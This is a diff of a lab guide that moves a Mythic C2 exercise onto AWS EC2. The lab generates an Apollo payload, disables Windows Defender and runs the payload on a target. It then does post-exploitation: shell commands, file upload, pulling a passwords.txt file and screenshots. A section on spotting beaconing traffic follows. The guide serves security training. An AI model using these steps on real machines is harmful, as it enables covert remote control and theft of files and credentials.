@@ -1,275 +1,337 @@
-# Mythic C2 Framework
+![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)
 
-# Both VMs ( Start from the Ubuntu VM )
-
+# Mythic C2 Framework — AWS Deployment
+ 
+# Ubuntu VM (management) · AWS EC2 (Mythic Server) · Windows VM (target)
+ 
 ## In this lab we will
-- Install and run the **Mythic** C2 framework
-- Generate a working payload using the **Apollo** agent
+- Deploy a Mythic C2 server on **AWS EC2** using a CloudFormation template
+- Install the **Apollo** agent and **HTTP** C2 profile on the EC2 instance
+- Generate a working payload that calls back to the EC2 server
 - Establish a C2 callback from a Windows target
 - Use Mythic's web UI to run post-exploitation tasks (file listing, process listing, shell commands)
 - Understand what C2 traffic looks like from the defender's perspective
-
-
-
 ---
-
+ 
 ## What is Mythic?
-
+ 
 **Mythic** is a modular C2 (Command and Control) framework. It has three main pieces:
-
-- **Mythic Server** - the backend that operators connect to. Runs in Docker.
-- **C2 Profiles** - define how agents communicate (HTTP, HTTPS, DNS, etc.)
-- **Agents** - the payload that runs on the target machine and calls back to the server.
-
+ 
+- **Mythic Server** — the backend that operators connect to. Runs in Docker.
+- **C2 Profiles** — define how agents communicate (HTTP, HTTPS, DNS, etc.)
+- **Agents** — the payload that runs on the target machine and calls back to the server.
 The most common beginner-friendly agent is **Apollo**, which runs on Windows and communicates over HTTP/HTTPS.
-
+ 
+> **Why AWS?** Mythic and its Docker containers require ~13 GB of disk space. Rather than straining your local Ubuntu VM, we spin up a dedicated EC2 instance (`t3.large`, 30 GB) via CloudFormation and tear it down when we're done.
+ 
 ---
+ 
+## Prerequisites 
 
-## Part 1 - Install and Run Mythic on Ubuntu
+>[!NOTE]
+>You can finish this part on your personal computer, and doing so **is recommended, since it would spare you the transfer of the key file from the VM to your personal computer.**
+>There are, however, instructions on how to move the key pair to your personal computer. 
+ 
+### AWS Account
+ 
+If you do not have an AWS account yet, complete **[ScoutSuite Lab — Phase 1](/Decks/CORE_v3.1/IC/labs/scoutsuite.md)** before continuing. That section walks you through account creation.
+ 
+### SSH Key Pair
 
-Clone the Mythic repository:
+- In the AWS Search Bar type **Key Pairs**:
 
+<img width="1224" height="696" alt="image" src="https://github.com/user-attachments/assets/dc363303-122d-4249-81ac-304abd2e20c3" />
+
+- In the corner right corner - click **Create Key Pair**
+
+<img width="1665" height="268" alt="image" src="https://github.com/user-attachments/assets/821bc121-1840-4c6c-95fd-8337b35e4d80" />
+
+- Give the Key a simple name, select **Key Pair Type - RSA** and **Private key file format - .pem**, then click **Create** :
+
+>[!IMPORTANT]
+>As long as you delete the key after finishing the lab, the name can be anything. It is recommended however that you name the key **Mythic-key** or something similar.
+>Be aware of the fact that **you will be given the .pem file only once.**
+
+<img width="1146" height="655" alt="image" src="https://github.com/user-attachments/assets/7615002a-eb78-4630-9b42-a63986fc6911" />
+
+# Moving the key
+ 
+---
+ 
+## Part 1 — Deploy the Mythic Server with CloudFormation
+ 
+The CloudFormation template (`mythic_cloudformation_config.yaml`) creates:
+- An EC2 `t3.large` instance (8 GB RAM, 30 GB gp3 disk) running Ubuntu 22.04
+- A Security Group that opens ports **22** (SSH), **80** (agent callbacks), and **7443** (Mythic Web UI)
+### Deploy the stack
+ 
+1. Open the **AWS Console** and navigate to **CloudFormation → Stacks → Create stack → With new resources (standard)**.
+2. Under *Specify template*, choose **Upload a template file** and upload `mythic_cloudformation_config.yaml`.
+3. Click **Next** and fill in the parameters:
+   - **KeyName** — select your existing key pair from the dropdown.
+   - **InstanceType** — leave as `t3.large` (required for Mythic's Docker workload).
+4. Click through the remaining screens and hit **Create stack**.
+Wait until the stack status shows `CREATE_COMPLETE` (~2 minutes).
+ 
+### Grab the outputs
+ 
+Go to the **Outputs** tab of the newly created stack. Note down:
+ 
+| Output key | What it is |
+|---|---|
+| `PublicIP` | The EC2 instance's public IP — you will use this everywhere |
+| `SSHCommand` | Ready-to-paste SSH command |
+| `MythicUI` | Direct link to the Mythic web UI |
+ 
+---
+ 
+## Part 2 — Connect to the EC2 Instance
+ 
+Open a terminal on your Ubuntu VM and connect using the `SSHCommand` from the Outputs tab:
+ 
 ```bash
-rm -rf ~/.local/share/Trash/
-cd ~/BnB/
+ssh -i "your_key.pem" ubuntu@<EC2_PUBLIC_IP>
+```
+ 
+> Replace `<EC2_PUBLIC_IP>` with the value from the `PublicIP` output. You will use this IP address in every step that follows.
+ 
+---
+ 
+## Part 3 — Install and Start Mythic on EC2
+ 
+Once you are inside the EC2 instance, clone the Mythic repository:
+ 
+```bash
+cd ~
 git clone https://github.com/its-a-feature/Mythic
 cd Mythic
 ```
-
+ 
 Install the Mythic CLI:
-
+ 
 ```bash
 sudo make
 ```
-
-Start Mythic:
-
+ 
+Start Mythic (this pulls all required Docker containers — takes 2–5 minutes the first time):
+ 
 ```bash
 sudo ./mythic-cli start
 ```
-
-This pulls all rquired Docker containers and starts the Mythic server. It will take 2-5 minutes the first time.
-
+ 
 When it finishes you will see output similar to:
-
+ 
 ```
 [*] Mythic services started
-[*] Web UI available at: https://127.0.0.1:7443
+[*] Web UI available at: https://0.0.0.0:7443
 ```
-
+ 
 Get the auto-generated admin password:
-
+ 
 ```bash
 sudo ./mythic-cli config get MYTHIC_ADMIN_PASSWORD
 ```
-
+ 
 Note down the password. The default username is `mythic_admin`.
-
+ 
 ---
-
-## Part 2 - Access the Mythic Web UI
-
-Open Firefox and go to:
-
+ 
+## Part 4 — Access the Mythic Web UI
+ 
+On your Ubuntu VM, open Firefox and go to (use the IP from the CloudFormation output):
+ 
 ```
-https://127.0.0.1:7443
+https://<EC2_PUBLIC_IP>:7443
 ```
-
-Accept the self-signed certificate warning (click "Advanced" -> "Accept the Risk and Continue").
-
+ 
+Accept the self-signed certificate warning (click **Advanced → Accept the Risk and Continue**).
+ 
 Log in with:
 - **Username:** `mythic_admin`
 - **Password:** (the one you copied above)
-
-You will land on the Mythic dashboard. It looks like this - the left sidebar has: Callbacks, Payloads, Files, Operations, and more.
-
+You will land on the Mythic dashboard. The left sidebar has: Callbacks, Payloads, Files, Operations, and more.
+ 
 ---
-
-## Part 3 - Install the Apollo Agent and HTTP Profile
-
-Mythic ships with no agents by default. You install them separately.
-
-Install the **Apollo** Windows agent:
-
+ 
+## Part 5 — Install the Apollo Agent and HTTP Profile
+ 
+Back in your SSH session on the EC2 instance, install the **Apollo** Windows agent:
+ 
 ```bash
 sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo
 ```
-
+ 
 Install the **http** C2 profile (the transport layer):
-
+ 
 ```bash
 sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
 ```
-
-Wait for both to finish installing. You will see "Successfully installed" messages.
-
+ 
+Wait for both to finish — you will see "Successfully installed" messages.
+ 
 Restart Mythic so it picks up the new agent and profile:
-
+ 
 ```bash
 sudo ./mythic-cli restart
 ```
-
+ 
 ---
-
-## Part 4 - Generate a Payload
-
-In the Mythic web UI, click **Payloads** in the left sidebar -> **New Payload**.
-
+ 
+## Part 6 — Generate a Payload
+ 
+In the Mythic web UI, click **Payloads** in the left sidebar → **New Payload**.
+ 
 Walk through the payload builder:
-
-1. **Select OS** -> Windows
-2. **Select Agent** -> Apollo
-3. **Select C2 Profile** -> http
+ 
+1. **Select OS** → Windows
+2. **Select Agent** → Apollo
+3. **Select C2 Profile** → http
 4. **C2 Profile config:**
-   - **Callback Host** -> enter your Ubuntu machine's IP address (find it with `ip a` - look for your interface IP, e.g. `192.168.56.101`)
-   - **Callback Port** -> `80`
-   - **Callback Interval** -> `5` (seconds between check-ins)
-5. **Output format** -> `WinExe` (a .exe file)
+   - **Callback Host** → enter your EC2 public IP (`<EC2_PUBLIC_IP>`)
+   - **Callback Port** → `80`
+   - **Callback Interval** → `5` (seconds between check-ins)
+5. **Output format** → `WinExe` (a .exe file)
 6. Click **Generate**
-
-Mythic will build the payload. When it finishes, download it - it will be named something like `apollo.exe`.
-
-Transfer `apollo.exe` to your Windows target machine. You can use a simple Python HTTP server on Ubuntu:
-
+Mythic builds the payload in Docker on the EC2 instance. When it finishes, click **Download** — the file will be named something like `apollo.exe`. Your browser downloads it directly from the EC2 server.
+ 
+Transfer `apollo.exe` to your Windows target machine. You can host it from the EC2 instance:
+ 
 ```bash
 cd ~/Downloads
 python3 -m http.server 8080
 ```
-
+ 
 Then on the Windows machine, open a browser and go to:
-
+ 
 ```
-http://<ubuntu-ip>:8080/apollo.exe
+http://<EC2_PUBLIC_IP>:8080/apollo.exe
 ```
-
+ 
 Download and save the file.
-
+ 
 ---
-
-## Part 5 - Execute the Payload on Windows
-
+ 
+## Part 7 — Execute the Payload on Windows
+ 
 >[!NOTE]
 > Windows Defender will flag and delete this file. You need to either disable Defender on your lab VM or add an exclusion for the folder where you saved the file. This is expected in a lab environment.
-
-Disable Defender on Windows (lab only - do not do this on real machines):
-
+ 
+Disable Defender on Windows (lab only — do not do this on real machines):
+ 
 Open PowerShell as Administrator and run:
-
+ 
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
-
-Now run the payload. In a regular Command Prompt or PowerShell (does not need to be Admin for basic access):
-
+ 
+Now run the payload:
+ 
 ```powershell
 .\apollo.exe
 ```
-
-Switch back to your Ubuntu machine and look at the Mythic web UI. Under **Callbacks**, you will see a new entry appear within a few seconds. This is the Windows machine calling back to your C2 server.
-
+ 
+Switch back to the Mythic web UI. Under **Callbacks**, you will see a new entry appear within a few seconds. This is the Windows machine calling back to your EC2 C2 server.
+ 
 ---
-
-## Part 6 - Interact with the Callback
-
+ 
+## Part 8 — Interact with the Callback
+ 
 Click on the callback row in the UI. A task panel opens at the bottom.
-
+ 
 ### List files
-
-Type in the task box:
-
+ 
 ```
 ls C:\Users
 ```
-
-Hit Enter. Mythic sends the command to the agent on the next check-in. Within 5 seconds you will see the directory listing appear.
-
+ 
 ### List running processes
-
+ 
 ```
 ps
 ```
-
+ 
 You will see a full list of running processes, their PIDs, parent PIDs, and process paths. This is exactly what a threat actor would use to look for AV processes, browsers with saved credentials, or privileged processes to migrate into.
-
+ 
 ### Get current user and hostname
-
+ 
 ```
 shell whoami
 shell hostname
 shell ipconfig
 ```
-
-Each `shell` command runs the argument in `cmd.exe` and returns the output. You can run any command here.
-
+ 
+Each `shell` command runs the argument in `cmd.exe` and returns the output.
+ 
 ### Upload a file
-
+ 
 ```
 upload
 ```
-
-Mythic will prompt you to select a file from your Ubuntu machine. The agent receives it and writes it to disk on the Windows target. Attackers use this to drop additional tools.
-
+ 
+Mythic will prompt you to select a file from your local machine. The agent receives it and writes it to disk on the Windows target.
+ 
 ### Download a file from the target
-
+ 
 ```
 download C:\Users\<username>\Desktop\passwords.txt
 ```
-
-If that file exists, Mythic will pull it back to the server and it will appear under **Files** in the UI.
-
+ 
+If that file exists, Mythic will pull it back to the EC2 server and it will appear under **Files** in the UI.
+ 
 ### Get a screenshot
-
+ 
 ```
 screenshot
 ```
-
+ 
 Apollo captures the current screen of the Windows machine and sends it back. It appears under **Files**.
-
+ 
 ---
-
-## Part 7 - What does this look like on the network?
-
-On your Ubuntu machine, open a second terminal and capture traffic on port 80:
-
+ 
+## Part 9 — What does this look like on the network?
+ 
+In your SSH session on the EC2 instance, open a second terminal tab and capture traffic on port 80:
+ 
 ```bash
 sudo apt install -y tshark
 sudo tshark -i any -f "port 80" -Y "http"
 ```
-
-You will see regular HTTP GET/POST requests from the Windows machine to your Ubuntu IP. The agent is beaconing - calling home every 5 seconds to ask for new tasks.
-
+ 
+You will see regular HTTP GET/POST requests arriving from the Windows machine. The agent is beaconing — calling home every 5 seconds to ask for new tasks.
+ 
 Key things to observe:
-- **Regular interval** - real user traffic is not this regular. A beacon every 5 seconds is a detection signal.
-- **User-Agent** - Apollo sends a browser-like User-Agent to blend in, but it will always be the same string.
-- **POST requests** - when you issue a task, the agent sends results back in a POST. The content is encrypted but the pattern is detectable.
-
-This is exactly what a blue teamer looks for in network logs. Consistent beaconing intervals, unusual POST traffic, or a process making HTTP connections that has no reason to.
-
+- **Regular interval** — real user traffic is not this regular. A beacon every 5 seconds is a detection signal.
+- **User-Agent** — Apollo sends a browser-like User-Agent to blend in, but it will always be the same string.
+- **POST requests** — when you issue a task, the agent sends results back in a POST. The content is encrypted but the pattern is detectable.
+This is exactly what a blue teamer looks for in network logs: consistent beaconing intervals, unusual POST traffic, or a process making HTTP connections that has no business reason to.
+ 
 ---
-
-## Part 8 - Clean up
-
-On Windows, kill the agent process:
-
+ 
+## Part 10 — Clean Up
+ 
+**On Windows**, kill the agent process and re-enable Defender:
+ 
 ```powershell
 Stop-Process -Name apollo -Force
-```
-
-Re-enable Defender on Windows:
-
-```powershell
 Set-MpPreference -DisableRealtimeMonitoring $false
 ```
-
-On Ubuntu, stop Mythic:
-
+ 
+**On the EC2 instance** (via SSH), stop Mythic:
+ 
 ```bash
 cd ~/Mythic
 sudo ./mythic-cli stop
 ```
-
+ 
+**Delete the CloudFormation stack** to terminate the EC2 instance and avoid ongoing charges:
+ 
+1. In the AWS Console, go to **CloudFormation → Stacks**.
+2. Select your Mythic stack.
+3. Click **Delete** and confirm.
+Wait for the status to reach `DELETE_COMPLETE`. The EC2 instance, security group, and all associated resources are removed.
+ 
 ---
-
+ 
 # Finished?
-
+ 
 [Back to Card's Main Page](/Decks/CORE_v3.1/C2E/Domain_Fronting_As_C2.md)
